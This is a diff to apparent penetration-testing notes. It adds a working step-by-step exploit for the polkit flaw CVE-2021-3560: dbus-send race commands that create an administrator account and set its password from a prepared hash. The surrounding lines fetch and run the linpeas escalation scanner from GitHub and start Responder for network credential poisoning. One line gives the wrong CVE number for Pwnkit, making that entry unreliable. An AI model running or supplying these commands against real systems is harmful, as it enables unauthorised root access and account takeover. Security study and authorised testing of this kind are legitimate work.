@@ -190,8 +190,15 @@ Linpeas git hub – scanner to check for local escalation
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 
 ./linpeas.sh -a > /dev/shm/linpeas.txt
 CVE-2021-4043 - Pwnkit exploit! - Its a handy one!
-polkit - https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
 
+polkit - https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
+1) Check for policykit-1 - apt list --installed | grep policykit-1
+2) send dbus message -
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"adm_paul" int32:1 & sleep 0.005s; kill $!
+3) Get a password hash
+openssl passwd -6 Expl01ted
+4) Set the user password using a dbus message
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
 ```
 # LLMNR/NBT
 responder -I eth0
